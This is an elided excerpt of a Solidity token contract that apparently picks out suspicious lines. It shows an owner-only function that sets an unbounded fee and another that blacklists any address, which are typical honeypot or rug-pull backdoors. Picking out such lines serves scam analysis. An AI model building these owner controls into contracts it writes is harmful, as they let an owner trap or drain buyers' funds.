...
abstract contract Token is IERC20, Ownable {
    ...
    mapping(address => bool) public _bkList;
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _gos + _buyLPDividendFee + _comes + _sellLPDividendFee + _sellLPFee;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _comes + _sellLPDividendFee + _sellLPFee;
            } else {
               
                swapFee = _gos + _buyLPDividendFee;
            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = fistBalance * (_gos + _comes) * 2 / swapFee;
    ...
    function setgo(uint256 s) external onlyOwner {
        _gos = s;
    }
    ...
    function setBkList(address addr, bool enable) external onlyOwner {
        _bkList[addr] = enable;
    }
